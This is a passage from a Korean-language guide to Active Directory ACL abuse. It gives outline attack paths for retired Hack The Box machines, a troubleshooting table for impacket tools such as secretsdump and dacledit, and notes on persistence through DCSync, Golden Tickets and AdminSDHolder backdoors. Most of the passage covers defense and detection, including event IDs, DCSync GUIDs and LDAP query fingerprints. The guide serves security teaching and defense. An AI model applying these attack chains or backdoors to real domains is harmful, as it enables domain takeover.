- 출처: [Microsoft — AdminSDHolder & 보호 계정](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory), [SpecterOps — AdminSDHolder Backdoor](https://posts.specterops.io/sneaky-active-directory-persistence-14-sidhistory-sneaky-beast-b7b07a9c9f0a)

---

## 9. 오너 학습 박스 흐름 연결 예

실전 체인은 거의 모두 BloodHound 경로로 시각화됩니다. 아래는 공개 랩에
한해, 경로 "뼈대"만 축약한 예입니다(머신 플래그·실 자격증명·세부 명령은
공개 금지 원칙에 따라 생략).

| 박스 | 경로 뼈대 |
|---|---|
| **HTB Certified** | 일반 사용자 → **WriteOwner on User** → 자신을 Owner로 → WriteDACL → **GenericAll on User** → 그 User가 특정 그룹 → **그룹 멤버십으로 Computer AddKeyCredentialLink** → Shadow Credentials → PKINIT → NT 해시 → AD CS 체인 |
| **HTB Cascade** | LDAP 검색으로 레거시 **Deleted Users 속성에서 암호화된 비밀번호** → DPAPI 복호화 → 그룹 멤버 → **LAPS 읽기** → 로컬 관리자 → **DCSync 가능 계정** 발견 |
| **HTB Blackfield** | AS-REP Roast → 사용자 평문 → ForceChangePassword ACE → 다른 사용자 비밀번호 리셋 → LSA 백업 추출 → **DCSync** |
| **HTB Forest** | AS-REP Roast → 사용자 → `Exchange Windows Permissions` 그룹 멤버 → **DCSync** (Exchange 2007 설치 시 추가되는 WriteDACL 상속의 역사적 결과) |
| **HTB Return** | 웹 애플리케이션 UI → **LDAP 서버 설정을 공격자 LDAP 로 변경** → 평문 자격증명 수집 → 서비스 계정 → gMSA / LAPS 체인 |
| **HTB Support** | SMB 공유에서 `UserInfo.exe` → 하드코딩 서비스 계정 비밀번호 → **GenericAll on Computer** → RBCD → 머신 admin |
| **HTB Monteverde** | Azure AD Sync 서비스 계정 비밀번호 유출 → **Azure AD Connect 서비스 계정이 DCSync 권한 보유** (설치 시 자동 부여) → DCSync |

이 경로들은 **"공격 자체"보다 "경로의 길이와 조건"을 BloodHound 로 확인하는
연습**에 쓸 가치가 있습니다. 운영 측에선 같은 BloodHound 로 **자사 경로**가
있는지 확인하는 것이 핵심입니다.

---

## 10. 자주 나는 오류 표

| 증상 | 원인 | 대응 |
|---|---|---|
| `impacket-dacledit` 가 "unsupported action" | 구버전 impacket | impacket 재설치(fortra fork 최신) 또는 PowerView `Add-DomainObjectAcl` |
| `insufficient access rights` on `secretsdump` | 복제 ACE 없음, 또는 `-just-dc-user` 가 DC 아닌 계정에 접근 | BloodHound 로 공격자 → Domain 노드 경로 재확인 |
| `KRB_AP_ERR_SKEW` | 시계 차이 5분 초과 | `ntpdate -q <dc>`; [[AD 심화 — Kerberos 티켓 위조와 위임 공격 완성|Kerberos 글]] §6.3 |
| `ms-Mcs-AdmPwd` 가 LDAP 에서 비어 보임 | 읽기 ACE 없음 or 신 LAPS 전환 | `msLAPS-Password`, `msLAPS-EncryptedPassword` 도 함께 쿼리 |
| `msDS-ManagedPassword` 가 `NO_OBJECT` | gMSA 계정이 아님 또는 `msDS-GroupMSAMembership` 비멤버 | BloodHound 로 공격자 → gMSA 경로, 또는 멤버 그룹 확인 |
| `changepasswd` 가 "Access denied" | Protected Users 가 대상이거나 `User-Change-Password` 확장권만 있고 ForceChangePassword 없음 | ForceChangePassword 확장권이 포함된 ACE 재확인 |
| `dacledit`/`owneredit` 가 성공 응답인데 BloodHound 그래프에 반영 안 됨 | BloodHound 수집이 캐시된 상태 | 재수집 (`-c ACL` 만 돌려도 됨) |
| 공격 후 `gpupdate` 실행했는데 반영 안 됨 | GPC `versionNumber` 와 GPT `gpt.ini` 의 버전이 불일치 | 둘 다 증가시키거나 pyGPOAbuse 재실행 |
| `DCSync` 가 되지만 `krbtgt` 만 거부 | DC 가 2016+ 에서 **PDC/RODC 정책**으로 krbtgt 복제 제한 | 다른 DC 지정, `-dc-ip` 교체 |
| ACL 변조 원복 중 "Access denied" | 변조로 **자기 자신이 ACL 접근을 잃음** | 다른 Principal 로 재인증, 사전 "비상 원복 계정" 준비 |

---

## 11. 방어 — 운영 설계로 끊기

### 11.1 Tier 모델

| 티어 | 대상 | 원칙 |
|---|---|---|
| **Tier 0** | DC, PKI, Identity 인프라, Tier-0 관리자 | **Tier-0 전용 Admin PC·전용 계정**, 다른 티어 로그온 금지 |
| **Tier 1** | 서버·백업·DB | Tier-0 자격증명으로 로그온 금지 |
| **Tier 2** | 워크스테이션 | 일반 사용자 — Tier-0/1 자격증명 금지 |

Microsoft의 "Enhanced Security Admin Environment(ESAE, 통칭 Red Forest)"
는 공식적으로 레거시이지만, **Tier 모델 자체는 2024 가이드에서도 유효**
합니다. 현대 권장은 **Enterprise Access Model + Privileged Access
Workstation(PAW)**.

### 11.2 민감 객체 ACL 감사

- 매주 자동 스크립트로 아래 질의 실행:
  - Domain 객체의 `DS-Replication-Get-Changes-All` 보유 Principal 전수
  - AdminSDHolder 의 WriteDACL/GenericAll 보유 Principal 전수
  - 각 Tier-0 User/Computer 의 Owner, GenericAll, WriteDACL 보유 Principal
- BloodHound CE 의 **"Early Warning" 알림** 기능 활용

### 11.3 보호된 그룹 (`adminCount=1`)

- **Protected Users** 그룹을 Tier-0 전원에 적용 — NTLM/RC4 차단, TGT
  수명 단축, 위임 금지
- Account Operators / Backup Operators / Server Operators / Print
  Operators 그룹 **전원 리뷰** — 역사적으로 과도한 권한이 묶여 있음

### 11.4 LAPS 접근 제한

- 신 LAPS 도입 + `msLAPS-EncryptedPassword` (Key Trust) 활성
- 레거시 `ms-Mcs-AdmPwd` 가 남아있다면 **삭제 또는 Deny ACE**
- 읽기 ACE 는 **Help Desk 서브셋** 또는 PAM 시스템 자체 서비스 계정만

### 11.5 GPO 변경 감사

- `Default Domain Policy` / `Default Domain Controllers Policy` 변경에
  **4분 이내 알람**
- 모든 GPO 변경을 **CMDB/ITSM 티켓**과 교차 확인
- GPO 생성 권한(Group Policy Creator Owners) 멤버 **최소 2명**

### 11.6 Just-in-Time 관리

- Domain Admins 그룹에는 **일상 멤버 0명** 원칙
- JIT(예: PAM, Entra PIM, Azure AD Privileged Identity Management) 로
  **요청 → 승인 → 시간제한 멤버십** 흐름
- JIT 중에도 Protected Users 적용

### 11.7 AdminSDHolder 감시

- SDProp 이 **기본 60분** 임을 전제로, **5136 + 4780** 알림을 조합해
  **60분 미만의 짧은 이상 변경**도 포착
- AdminSDHolder 객체 자체의 ACL 변경은 **즉시 알람 + 자동 롤백**

### 11.8 체크리스트

- [ ] Replicating Directory Changes/All 가 DA/EA/DC 외에 없음
- [ ] AdminSDHolder ACL 에 WriteDACL/GenericAll 보유 비정상 Principal 없음
- [ ] `ms-DS-MachineAccountQuota = 0`
- [ ] Protected Users 그룹에 Tier-0 전원 등록
- [ ] LAPS 비밀번호 읽기 ACE 가 운영 그룹으로 축소
- [ ] gMSA 의 `msDS-GroupMSAMembership` 가 필요한 호스트로만 제한
- [ ] GPO 변경 감사 룰 활성
- [ ] DC 가 Tier-0 네트워크 세그먼트에 격리

- 출처: [Microsoft — Enterprise Access Model](https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-access-model), [Microsoft — Privileged Access Workstations](https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-devices), [Microsoft — Protected Users 그룹](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group), [Microsoft — Securing Privileged Access](https://learn.microsoft.com/en-us/security/privileged-access-workstations/)

---

## 12. 탐지 — 로그 ID·Zeek·BloodHound CE 자동화

### 12.1 핵심 Event ID

| Event ID | 소스 | 의미 |
|---|---|---|
| **4662** | Security (DC) | AD 객체 접근/변경. `Properties` 필드의 GUID 로 **DCSync, LAPS 읽기, gMSA 읽기, KeyCredentialLink 쓰기** 식별 |
| **5136** | Security (DC) | 디렉터리 객체 변경 — ACL 변경·속성 변경 |
| **4780** | Security (DC) | SDProp 이 보호 그룹 ACL 재설정 — AdminSDHolder 변경 간접 신호 |
| **4720** | Security (DC) | **사용자 계정 생성** — addcomputer 포함 머신 계정 생성도 함께 감시 |
| **4732 / 4728** | Security (DC) | 로컬/글로벌 그룹에 멤버 추가 — AddMember 공격 신호 |
| **4738** | Security (DC) | 사용자 계정 변경 — UAC 플래그 변경 신호 |
| **4769** | Security (DC) | TGS 발급 — Kerberos 체인과 연결 |
| **4624 / 4625** | Security (모든 호스트) | 로그온 성공/실패 — LAPS 획득 후 WMI/SMB 로그인 추적 |

### 12.2 4662 의 핵심 GUID

| GUID | 뜻 |
|---|---|
| `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes |
| `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes-All → **DCSync** 핵심 |
| `89e95b76-444d-4c62-991a-0facbeda640c` | DS-Replication-Get-Changes-In-Filtered-Set |
| `5b47d60f-6090-40b2-9f37-2a4de88f3063` | msDS-KeyCredentialLink → **Shadow Credentials** |
| `00299570-246d-11d0-a768-00aa006e0529` | User-Force-Change-Password |
| `bf967a7e-0de6-11d0-a285-00aa003049e2` | ms-Mcs-AdmPwd (레거시 LAPS) |

### 12.3 Zeek LDAP 로그

Zeek 의 LDAP 분석기(2023+)는 **ldapsearch 기반 수집**(ldapdomaindump,
bloodhound-python) 을 로그로 남깁니다. 비정상적으로 큰 **`baseObject` +
`subtree` 검색**, 특히 `(objectClass=*)` 과 `(samAccountType=805306368)`
같은 쿼리는 BloodHound 수집의 전형적 지문입니다.

### 12.4 BloodHound CE 공격 경로 자동 알림

BloodHound CE 는 **"Attack Paths"** 기능에서 **"User has Domain Admin
within X hops"** 조건을 **매일 재평가**합니다. 새로 등장한 경로가 생기면
알림/티켓 자동 발행. 가장 가치 높은 기능 중 하나이며, 운영 측은
**"경로 수 감소율"** 을 KPI 로 관리합니다.

### 12.5 상관 분석 예

- **4720 (user created)** + **5136 (msDS-AllowedToActOnBehalfOfOtherIdentity
  write)** 가 **같은 Principal** 에서 수분 내 → RBCD 공격 패턴
- **4662 (DCSync GUID)** 가 **Non-DC Principal** 에서 → 즉시 알람
- **4738 + UAC 변경(0x400000 or 0x80000)** → AS-REP 가능 토글 또는
  Unconstrained 토글 — 공격 사전 준비 신호

- 출처: [Microsoft — Audit Directory Service Access](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-directory-service-access), [Zeek LDAP](https://docs.zeek.org/en/current/scripts/base/protocols/ldap/), [SpecterOps — BloodHound CE Attack Paths](https://support.bloodhoundenterprise.io/hc/en-us/articles/16124484138651)

---

## 13. 실습 환경 (공개 랩)

| 환경 | 다루는 기법 | 공식 문서 |
|---|---|---|
| [GOAD — North.sevenkingdoms / Essos / 완전판](https://github.com/Orange-Cyberdefense/GOAD) | ACL 체인, LAPS, DCSync, GPO 남용, Trust | GOAD README |
| [GOAD-Light](https://github.com/Orange-Cyberdefense/GOAD) | 축소판, 기본 ACL + DCSync | 상동 |
| [HTB — Forest (은퇴)](https://www.hackthebox.com/machines/Forest) | AS-REP Roast → Exchange ACL → DCSync | HTB 공식 Writeups |
| [HTB — Cascade (은퇴)](https://www.hackthebox.com/machines/Cascade) | DPAPI 복호화 → LAPS 체인 | 상동 |
| [HTB — Blackfield (은퇴)](https://www.hackthebox.com/machines/Blackfield) | AS-REP + ForceChangePassword + LSA 백업 + DCSync | 상동 |
| [HTB — Return (은퇴)](https://www.hackthebox.com/machines/Return) | 웹 UI 로 LDAP 설정 변조 → 평문 자격증명 수집 → 서비스 체인 | 상동 |
| [HTB — Support (은퇴)](https://www.hackthebox.com/machines/Support) | LDAP 비밀번호 추출 → GenericAll on Computer → RBCD | 상동 |
| [HTB — Monteverde (은퇴)](https://www.hackthebox.com/machines/Monteverde) | Azure AD Connect 서비스 계정 → DCSync | 상동 |
| [HTB — Certified (은퇴)](https://www.hackthebox.com/machines/Certified) | WriteOwner → GenericAll → Shadow Credentials → AD CS | 상동 |
| [HTB — Intelligence (은퇴)](https://www.hackthebox.com/machines/Intelligence) | DNS 레코드 + gMSA | 상동 |

ACL 공격은 **흔적을 남기는 변경을 반드시 포함**하므로 랩에서도 모든
명령·ACE·그룹 멤버십·비밀번호 변경을 기록하고 교전 종료 전 원복하세요.
`dacledit -action remove`, `owneredit -action write -new-owner <원본>`,
`Remove-DomainGroupMember` 등 **원복 명령의 성공 응답까지 확인**합니다.

---

## 14. 다음 단계로 이어지는 공격

- **인증 영역으로**: ACL 로 얻은 `AddKeyCredentialLink` → Shadow
  Credentials → PKINIT → NT 해시. 자세히는
  [[AD 심화 — AD CS 인증서 공격 전수 정리|AD CS 글]] §4 와
  [[AD 심화 — Kerberos 티켓 위조와 위임 공격 완성|Kerberos 티켓 위조·위임]]
  §5. **"ACL → 인증서 → 티켓"** 3단 연계가 전형적입니다.
- **릴레이와 조합**: ACL 로 머신 객체의 `msDS-AllowedToActOnBehalfOf
  OtherIdentity` 를 쓸 수 있으면, [[AD 심화 — 강제 인증과 릴레이의 이해와
  방어|강제 인증·릴레이]] 에서 수집한 머신 계정 인증을 RBCD 대상으로
  전환해 재사용할 수 있습니다.
- **지속성(Persistence)**: DCSync + Golden Ticket 조합은 **krbtgt 2회
  리셋 전까지 영구 지속성**. 추가로 **AdminSDHolder ACL ACE** 와
  **Shadow Credentials** 는 **그룹 멤버십 없이도** 복귀 가능한 백도어가
  됩니다. 방어 측은 **한 종류의 지속성 제거로 안심하면 안 된다**는 점을
  명심하세요.
- **Forest 경계**: 같은 Forest 내 교차 도메인 ACL(Enterprise Admins,
  Schema Admins 쓰기) 은 Forest 전체에 영향을 줍니다. **보안 경계는
  Forest** 원칙이 ACL 영역에서도 유지됩니다. 세부 Forest/Trust 구조는
  [[공격 체인 이전의 AD 아키텍처 기초 — Kerberos, NTLM, DACL·ACE, GPO·SYSVOL, 도메인 트러스트|AD 아키텍처 기초]].
- **Entra ID 와의 교차**: Azure AD Connect 서비스 계정에 DCSync 권한이
  설치 시 자동 부여됩니다. 그 계정이 유출되면 하이브리드 환경에서 Entra
  ID 쪽으로도 영향 확산. 하이브리드 공격은 별도 글 범위.

---

- 출처 모음: [SpecterOps — BloodHound CE 문서](https://support.bloodhoundenterprise.io/), [BloodHoundAD/BloodHound-Legacy](https://github.com/BloodHoundAD/BloodHound), [harmj0y — ACE 설계](https://posts.specterops.io/an-ace-up-the-sleeve-designing-active-directory-dacl-backdoors-5c7fd3f7f38), [dirkjanm — AD 상세 블로그](https://dirkjanm.io/), [fortra/impacket secretsdump/dacledit/owneredit](https://github.com/fortra/impacket), [Microsoft — Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview), [Microsoft — gMSA](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), [Microsoft — AdminSDHolder](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory), [Hackndo/pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse), [FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse), [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec), [Orange Cyberdefense GOAD](https://github.com/Orange-Cyberdefense/GOAD)
